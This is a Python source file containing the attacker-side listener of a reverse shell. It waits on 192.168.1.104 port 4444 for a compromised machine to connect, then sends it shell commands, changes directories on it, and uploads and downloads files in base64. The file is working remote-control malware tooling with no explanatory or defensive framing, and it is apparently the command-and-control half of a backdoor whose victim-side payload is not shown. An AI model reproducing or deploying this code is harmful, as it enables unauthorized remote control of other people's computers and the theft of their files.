import socket
import json
import base64
import traceback


class Listener:
   def __init__(self, ip, port):
      listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      listener.bind((ip, port))
      listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      listener.listen(0)
      print("[+] WAITTING FOR INCOMING CONNECTIONS")
      self.connection, address = listener.accept()
      print(f"[+] GOT A CONNECTION FROM {str(address)}")


   def reliable_send(self, data):
      json_data = json.dumps(data)
      self.connection.send(json_data.encode())

      
   def reliable_recive(self):
      json_data = b""
      while True:
         try:
            json_data = json_data + self.connection.recv(1024)
            return json.loads(json_data)
         except ValueError:
            continue

         
   def execute_remotely(self, command):
      self.reliable_send(command)
      
      if command[0] == "exit":
         self.connection.close()
         exit()
      
      return self.reliable_recive()


   def write_file(self, path, content):
      with open(path, "wb") as file:
         file.write(base64.b64decode(content))
         return "[+] DOWNLOAD SUCCESSFUL"


   def read_file(self, path):
      with open(path, "rb") as file:
         return base64.b64encode(file.read())


   def run(self):
      while True:
         command = input("[:] ")
         command = command.split(" ")
         try:
            if command[0] == "upload":
               fileContent = self.read_file(command[1])
               command.append(fileContent.decode())
            elif command[0] == "cd" and len(command) > 2:
               command[1] = " ".join(command[1:])
            result = self.execute_remotely(command)
            
            if command[0] == "download" and "[-] ERROR " not in result:
               result = self.write_file(command[1], result)
         except Exception:
            result = "[-] ERROR DURING COMMAND EXECUTION"
         
         print(result)
      

if __name__ == "__main__":
   listener = Listener("192.168.1.104", 4444)
   listener.run()